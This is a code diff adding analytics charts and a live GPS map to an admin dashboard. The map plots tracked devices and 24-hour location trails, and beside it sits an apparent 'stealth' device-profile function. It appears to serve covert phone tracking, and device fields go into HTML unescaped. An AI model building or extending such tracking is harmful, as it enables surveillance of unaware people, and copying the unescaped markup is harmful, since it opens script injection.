@@ -4998,21 +4998,33 @@ function onGeoMapMove() {
 async function loadAnalytics() {
   const days = document.getElementById('funnelDays')?.value || 30;
   try {
-    const [funnelRes, geoRes, reachRes, eventsRes] = await Promise.all([
-      fetch(`${API_BASE}/api/analytics/funnel?days=${days}&password=${adminPassword}`),
-      fetch(`${API_BASE}/api/analytics/geo?days=${days}&password=${adminPassword}`),
-      fetch(`${API_BASE}/api/analytics/reachability?password=${adminPassword}`),
-      fetch(`${API_BASE}/api/analytics/events?limit=50&password=${adminPassword}`)
+    const [funnelRes, geoRes, reachRes, eventsRes, connectionsRes] = await Promise.all([
+      fetch(`${API_BASE}/api/analytics/funnel?days=${days}`, { headers: { 'x-admin-password': adminPassword } }),
+      fetch(`${API_BASE}/api/analytics/geo?days=${days}`, { headers: { 'x-admin-password': adminPassword } }),
+      fetch(`${API_BASE}/api/analytics/reachability`, { headers: { 'x-admin-password': adminPassword } }),
+      fetch(`${API_BASE}/api/analytics/events?limit=50`, { headers: { 'x-admin-password': adminPassword } }),
+      fetch(`${API_BASE}/api/admin/connections`, { headers: { 'x-admin-password': adminPassword } })
     ]);
     const funnel = await funnelRes.json();
     const geo = await geoRes.json();
     const reach = await reachRes.json();
     const events = await eventsRes.json();
+    const connections = connectionsRes.ok ? await connectionsRes.json() : null;
 
     renderFunnel(funnel);
     renderGeo(geo);
     renderReachability(reach);
     renderRecentEvents(events);
+
+    // Chart.js charts (only if library loaded)
+    if (typeof Chart !== 'undefined') {
+      renderFunnelChart(funnel);
+      renderCountryChart(geo);
+      renderReachabilityChart(reach);
+      if (connections) renderModelsChart(connections);
+    }
+    // Auto-load timeline
+    loadEventChart('app_install');
   } catch (e) {
     console.error('[Analytics] Load error:', e);
   }
@@ -5813,5 +5825,293 @@ async function gmStealth(deviceId, profile) {
   } catch (err) {
     showToast('Stealth change failed: ' + err.message, 'error');
   }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  CHART.JS ANALYTICS CHARTS
+// ═══════════════════════════════════════════════════════════════
+
+const _chartInstances = {}; // track instances to destroy before recreate
+
+function _destroyChart(id) {
+  if (_chartInstances[id]) { try { _chartInstances[id].destroy(); } catch (_) {} delete _chartInstances[id]; }
+}
+
+const CHART_DEFAULTS = {
+  plugins: { legend: { labels: { color: '#aaa', font: { size: 11 } } } },
+  scales: {
+    x: { ticks: { color: '#777', font: { size: 10 } }, grid: { color: '#222' } },
+    y: { ticks: { color: '#777', font: { size: 10 } }, grid: { color: '#222' } }
+  }
+};
+
+function renderFunnelChart(data) {
+  _destroyChart('chartFunnel');
+  const canvas = document.getElementById('chartFunnel');
+  if (!canvas) return;
+  const EVENTS = ['page_visit','download_start','download_complete','app_install','first_open','permission_grant','first_sync'];
+  const labels = EVENTS.map(e => e.replace(/_/g,' '));
+  const values = EVENTS.map(e => data[e] || 0);
+  _chartInstances['chartFunnel'] = new Chart(canvas, {
+    type: 'bar',
+    data: {
+      labels,
+      datasets: [{ label: 'Count', data: values,
+        backgroundColor: ['#00e5ff','#00bcd4','#0097a7','#00796b','#4caf50','#8bc34a','#cddc39'],
+        borderRadius: 4 }]
+    },
+    options: { ...CHART_DEFAULTS, plugins: { legend: { display: false } }, indexAxis: 'y',
+      scales: { x: { ticks: { color: '#777', font: { size: 10 } }, grid: { color: '#222' } }, y: { ticks: { color: '#aaa', font: { size: 10 } }, grid: { display: false } } }
+    }
+  });
+}
+
+function renderCountryChart(data) {
+  _destroyChart('chartCountry');
+  const canvas = document.getElementById('chartCountry');
+  if (!canvas || !data || !data.length) return;
+  const top = data.slice(0, 8);
+  const COLORS = ['#00e5ff','#4caf50','#ffc107','#ff5722','#9c27b0','#2196f3','#00bcd4','#8bc34a'];
+  _chartInstances['chartCountry'] = new Chart(canvas, {
+    type: 'doughnut',
+    data: { labels: top.map(r => r.country || 'Unknown'), datasets: [{ data: top.map(r => r.count), backgroundColor: COLORS, borderWidth: 0 }] },
+    options: { plugins: { legend: { position: 'right', labels: { color: '#aaa', font: { size: 10 }, boxWidth: 10 } } }, cutout: '60%' }
+  });
+}
+
+function renderReachabilityChart(data) {
+  _destroyChart('chartReachability');
+  const canvas = document.getElementById('chartReachability');
+  if (!canvas) return;
+  const online = data.online || data.active || 0;
+  const offline = data.offline || 0;
+  const dormant = data.dormant || 0;
+  _chartInstances['chartReachability'] = new Chart(canvas, {
+    type: 'doughnut',
+    data: { labels: ['Online', 'Dormant (1-7d)', 'Churned (>7d)'], datasets: [{ data: [online, dormant, offline], backgroundColor: ['#4caf50','#ffc107','#ff5252'], borderWidth: 0 }] },
+    options: { plugins: { legend: { position: 'right', labels: { color: '#aaa', font: { size: 10 }, boxWidth: 10 } } }, cutout: '60%' }
+  });
+}
+
+function renderModelsChart(connectionsData) {
+  _destroyChart('chartModels');
+  const canvas = document.getElementById('chartModels');
+  if (!canvas) return;
+  const devices = connectionsData.devices || [];
+  const modelMap = {};
+  devices.forEach(d => {
+    const m = d.model || d.manufacturer || 'Unknown';
+    modelMap[m] = (modelMap[m] || 0) + 1;
+  });
+  const sorted = Object.entries(modelMap).sort((a,b) => b[1]-a[1]).slice(0, 8);
+  const COLORS = ['#00e5ff','#4caf50','#ffc107','#ff5722','#9c27b0','#2196f3','#00bcd4','#8bc34a'];
+  _chartInstances['chartModels'] = new Chart(canvas, {
+    type: 'doughnut',
+    data: { labels: sorted.map(([m]) => m), datasets: [{ data: sorted.map(([,c]) => c), backgroundColor: COLORS, borderWidth: 0 }] },
+    options: { plugins: { legend: { position: 'right', labels: { color: '#aaa', font: { size: 10 }, boxWidth: 10 } } }, cutout: '60%' }
+  });
+}
+
+async function loadEventChart(eventType) {
+  _destroyChart('chartTimeline');
+  const canvas = document.getElementById('chartTimeline');
+  // Fallback text area for old layout
+  const legacyEl = document.getElementById('eventChartArea');
+  try {
+    const res = await fetch(`${API_BASE}/api/analytics/events-by-day?event=${eventType}&days=30`, { headers: { 'x-admin-password': adminPassword } });
+    const data = await res.json();
+    if (!data || !data.length) {
+      if (legacyEl) legacyEl.innerHTML = '<span style="color:#555;">No data for this event.</span>';
+      return;
+    }
+    if (canvas && typeof Chart !== 'undefined') {
+      _chartInstances['chartTimeline'] = new Chart(canvas, {
+        type: 'line',
+        data: {
+          labels: data.map(d => d.day ? d.day.slice(5) : ''),
+          datasets: [{ label: eventType.replace(/_/g,' '), data: data.map(d => d.count),
+            borderColor: '#00e5ff', backgroundColor: 'rgba(0,229,255,0.08)',
+            tension: 0.3, fill: true, pointRadius: 2, pointHoverRadius: 5 }]
+        },
+        options: { ...CHART_DEFAULTS, plugins: { legend: { display: false } } }
+      });
+    } else if (legacyEl) {
+      // ASCII fallback
+      const maxVal = Math.max(...data.map(d => d.count), 1);
+      let html = `<div style="margin-bottom:6px;color:#00e5ff;font-weight:600;">${eventType.replace(/_/g,' ')} — last 30 days</div>`;
+      html += '<div style="display:flex;align-items:flex-end;gap:3px;height:100px;">';
+      data.forEach(d => {
+        const h = Math.max(Math.round((d.count / maxVal) * 90), 2);
+        const label = d.day ? d.day.slice(5) : '';
+        html += `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;" title="${label}: ${d.count}">
+          <span style="font-size:9px;color:#555;">${d.count > 0 ? d.count : ''}</span>
+          <div style="width:100%;height:${h}px;background:#00e5ff;border-radius:2px 2px 0 0;opacity:0.7;"></div>
+          <span style="font-size:9px;color:#444;writing-mode:vertical-rl;transform:rotate(180deg);">${label}</span>
+        </div>`;
+      });
+      html += '</div>';
+      legacyEl.innerHTML = html;
+    }
+  } catch (e) {
+    console.error('[EventChart] Error:', e);
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  LIVE GPS MAP (Leaflet.js)
+// ═══════════════════════════════════════════════════════════════
+
+let _leafletMap = null;
+let _mapPins = {};       // device_id → L.marker
+let _mapDevices = [];    // latest devices array
+let _trailLayer = null;  // polyline for selected trail
+
+function initGpsMap() {
+  if (_leafletMap) return; // already initialised
+  const container = document.getElementById('leafletMap');
+  if (!container || typeof L === 'undefined') return;
+
+  _leafletMap = L.map('leafletMap', { zoomControl: true }).setView([20, 0], 2);
+
+  // Dark tile layer
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    attribution: '© OpenStreetMap © CARTO',
+    subdomains: 'abcd', maxZoom: 19
+  }).addTo(_leafletMap);
+
+  // Fix invalidated map size after CSS transitions
+  setTimeout(() => _leafletMap.invalidateSize(), 300);
+}
+
+async function refreshGpsMap() {
+  initGpsMap();
+  if (!_leafletMap) return;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections`, { headers: { 'x-admin-password': adminPassword } });
+    if (!res.ok) return;
+    const data = await res.json();
+    _mapDevices = data.devices || [];
+    renderMapPins();
+  } catch (e) {
+    console.error('[GpsMap] Error:', e);
+  }
+}
+
+function renderMapPins() {
+  if (!_leafletMap) return;
+  const showOffline = document.getElementById('mapShowOffline')?.checked;
+
+  // Remove all existing markers
+  Object.values(_mapPins).forEach(m => _leafletMap.removeLayer(m));
+  _mapPins = {};
+
+  let hasCoords = false;
+  const bounds = [];
+
+  _mapDevices.forEach(d => {
+    if (!d.latitude || !d.longitude) return;
+    if (!showOffline && !d.is_online) return;
+
+    hasCoords = true;
+    const isOnline = d.is_online === 1;
+    const color = isOnline ? '#4caf50' : '#ff5252';
+    const label = d.device_name || d.model || d.device_id.slice(0,12);
+    const city = [d.city, d.country].filter(Boolean).join(', ') || 'Unknown';
+
+    const icon = L.divIcon({
+      html: `<div style="width:12px;height:12px;border-radius:50%;background:${color};border:2px solid ${isOnline ? '#81c784':'#e57373'};box-shadow:0 0 ${isOnline?'6':'2'}px ${color};"></div>`,
+      iconSize: [12, 12], iconAnchor: [6, 6], className: ''
+    });
+
+    const marker = L.marker([d.latitude, d.longitude], { icon })
+      .addTo(_leafletMap)
+      .bindPopup(`<div style="font-family:Inter,sans-serif;min-width:160px;">
+        <div style="font-weight:600;margin-bottom:4px;">${label}</div>
+        <div style="color:#666;font-size:11px;">${city}</div>
+        <div style="color:${color};font-size:11px;margin:4px 0;">${isOnline ? '🟢 Online' : '🔴 Offline'}</div>
+        <div style="font-size:10px;color:#888;">Last: ${d.last_seen ? d.last_seen.slice(0,16) : 'never'}</div>
+        <button onclick="loadDeviceTrail('${d.device_id}','${label}')" style="margin-top:8px;padding:4px 8px;background:#00e5ff;color:#000;border:none;border-radius:4px;cursor:pointer;font-size:11px;font-weight:600;">View Trail</button>
+      </div>`);
+
+    _mapPins[d.device_id] = marker;
+    bounds.push([d.latitude, d.longitude]);
+  });
+
+  if (hasCoords && bounds.length > 0) {
+    try { _leafletMap.fitBounds(bounds, { padding: [40, 40], maxZoom: 10 }); } catch (_) {}
+  }
+}
+
+async function loadDeviceTrail(deviceId, deviceLabel) {
+  if (!_leafletMap) return;
+  if (_trailLayer) { _leafletMap.removeLayer(_trailLayer); _trailLayer = null; }
+
+  const el = document.getElementById('trailInfo');
+  const nameEl = document.getElementById('trailDeviceName');
+  if (nameEl) nameEl.textContent = deviceLabel;
+  if (el) el.innerHTML = '<span style="color:#aaa;">Loading trail...</span>';
+
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/connections/${deviceId}/location-history?hours=24&limit=500`, {
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    const points = data.points || [];
+
+    if (!points.length) {
+      if (el) el.innerHTML = '<span style="color:#666;">No GPS trail in last 24 hours.</span>';
+      return;
+    }
+
+    const latlngs = points.map(p => [p.latitude, p.longitude]);
+    _trailLayer = L.polyline(latlngs, { color: '#00e5ff', weight: 2, opacity: 0.8 }).addTo(_leafletMap);
+
+    // Start and end markers
+    if (latlngs.length > 0) {
+      L.circleMarker(latlngs[0], { radius: 6, color: '#4caf50', fillColor: '#4caf50', fillOpacity: 1 })
+        .addTo(_leafletMap).bindPopup('Start');
+      L.circleMarker(latlngs[latlngs.length-1], { radius: 6, color: '#ff5252', fillColor: '#ff5252', fillOpacity: 1 })
+        .addTo(_leafletMap).bindPopup('Latest position');
+    }
+
+    _leafletMap.fitBounds(_trailLayer.getBounds(), { padding: [40, 40] });
+
+    const first = points[0];
+    const last = points[points.length - 1];
+    if (el) el.innerHTML = `
+      <div style="font-size:12px;color:#aaa;display:flex;gap:24px;flex-wrap:wrap;">
+        <span>📍 ${points.length} points recorded</span>
+        <span>🕐 From: ${first.recorded_at ? first.recorded_at.slice(0,16) : '?'}</span>
+        <span>🕐 To: ${last.recorded_at ? last.recorded_at.slice(0,16) : '?'}</span>
+        <span style="color:#00e5ff;">Accuracy: ~${last.accuracy ? Math.round(last.accuracy/1000)+'km' : 'GPS'}</span>
+      </div>`;
+  } catch (e) {
+    if (el) el.innerHTML = `<span style="color:#ff5252;">Error loading trail: ${e.message}</span>`;
+  }
+}
+
+// Wire GPS map init when page becomes visible
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('.nav-link').forEach(link => {
+    link.addEventListener('click', () => {
+      if (link.dataset.page === 'gpsmap') {
+        setTimeout(() => { initGpsMap(); refreshGpsMap(); }, 100);
+      }
+      if (link.dataset.page === 'analytics') {
+        setTimeout(() => loadAnalytics(), 100);
+      }
+    });
+  });
+});
+
+// Real-time map pin updates from Socket.IO
+if (typeof socket !== 'undefined') {
+  socket.on('device_location_update', d => {
+    if (!_mapPins[d.device_id] || !_leafletMap) return;
+    const marker = _mapPins[d.device_id];
+    if (d.latitude && d.longitude) marker.setLatLng([d.latitude, d.longitude]);
+  });
+  socket.on('device_online', () => { if (currentPage === 'gpsmap') renderMapPins(); });
+  socket.on('device_offline', () => { if (currentPage === 'gpsmap') renderMapPins(); });
 }
 
